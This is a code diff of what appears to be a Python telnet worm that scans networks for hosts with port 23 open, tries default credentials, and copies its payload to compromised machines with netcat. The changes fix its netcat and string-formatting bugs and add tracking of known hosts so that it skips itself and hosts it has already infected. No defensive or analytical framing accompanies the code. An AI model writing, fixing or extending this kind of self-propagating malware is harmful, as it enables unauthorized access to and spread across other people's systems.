@@ -42,8 +42,8 @@ def login(host, username, password):
 def replicate(tn):
     try:
         # Open nc connection to receive the file
-        tn.write("nc -l -p 1234 > out.file")  # CHANGE FILE NAME
-        os.system("nc -w 5 %s 1234 < in.file", tn.host)  # CHANGE FILE NAME
+        tn.write(b"nc -l -p 1234 > out.file")  # CHANGE FILE NAME
+        os.system("nc -w 5 {} 1234 < in.file".format(tn.host))  # CHANGE FILE NAME
         # EXECUTE SCRIPT HERE
         tn.close()
     except EOFError:
@@ -51,8 +51,15 @@ def replicate(tn):
 
 
 def network_replicate():
-    networks = search.get_ip_addresses()
+    global known_hosts
+
+    networks, ips = search.get_ip_addresses()
     print("IP addresses recognition")
+
+    # Add own IPs to known hosts
+    for ip in ips:
+        if ip not in known_hosts:
+            known_hosts.append(ip)
 
     for network in networks:
         print("Searching hosts for network:", network)
@@ -61,6 +68,8 @@ def network_replicate():
         for host in hosts:
             if not is_open(host, 23):
                 print("Port 23 is closed at host:", host)
+                continue
+            elif host in known_hosts:
                 continue
             print("Trying to login in host:", host)
             for user in DEFAULT_LOGINS:
